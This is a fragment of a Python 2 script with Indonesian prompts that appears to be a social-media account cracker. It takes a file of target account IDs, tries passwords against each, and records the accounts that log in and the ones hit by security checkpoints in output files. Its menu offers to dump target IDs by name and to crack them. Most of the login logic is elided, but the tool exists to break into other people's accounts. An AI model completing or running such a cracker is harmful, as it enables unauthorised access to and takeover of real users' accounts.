...
class crack:
	def __init__(self):
		...
		self.ko=0
		try:
			self.fl=open(raw_input("?: id target: ")).read().splitlines()
	...
	def pwlist(self):
		...
		if len(self.pw) ==0:
			...
			print "+: account yang bisa login: multiresult.txt"
			print "+: account yang checkpoint: checkpoint.txt"
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r[Crack] %s/%s - work login-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
...
while True:
	print "[1] Dump ID target dengan nama"
	print "[2] Crack\n"
	r=raw_input("?: pilih: ")
	if r=="":
		os.system("clear")
